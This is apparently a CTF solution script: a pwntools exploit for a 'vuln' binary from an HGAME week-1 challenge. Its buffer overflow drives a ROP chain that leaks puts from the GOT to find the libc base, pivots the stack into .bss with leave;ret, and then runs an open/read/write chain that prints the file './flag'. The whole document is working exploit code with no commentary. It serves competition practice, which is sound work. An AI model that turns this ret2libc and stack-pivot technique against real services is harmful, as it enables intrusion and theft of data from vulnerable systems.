from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

debug = True

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 30350)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP('./libc.so.6')
pop_rdi = rop.rdi.address

vuln = 0x4010B0
putsplt = elf.plt['puts']
putsgot = elf.got['puts']
readplt = elf.plt['read']

playload = b'\x00' * 0x100 + p64(0xdeadbeef) + p64(pop_rdi) + p64(putsgot) + p64(putsplt)
playload += p64(vuln)

io.sendlineafter("solve this task.\n", playload)
libcbase_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libcbase = libcbase_puts - libc.symbols['puts']

pop_rsi = roplibc.rsi.address + libcbase
pop_rdx = roplibc.rdx.address + libcbase
openaddr = libc.symbols['open'] + libcbase
readaddr = libc.symbols['read'] + libcbase
writeaddr = libc.symbols['write'] + libcbase
log.info(hex(libcbase))

bssaddr = 0x404060 + 0x100
leave_ret = 0x4012EE

pay = b'\x00' * 0x100
pay += p64(bssaddr + 5) + p64(pop_rsi) + p64(bssaddr + 5) + p64(readplt) + p64(leave_ret)

# ddebug()
io.sendlineafter('solve this task.\n', pay)

rop = p64(pop_rdi) + p64(bssaddr + 0xa0 + 5) + p64(pop_rsi) + p64(0) + p64(openaddr) #open
rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(readaddr) #read
rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bssaddr + 0x50) + p64(pop_rdx) + p64(0x30) + p64(writeaddr) # write
rop += b"./flag\x00"
pay = p64(0) + rop
io.send(pay)

io.interactive()
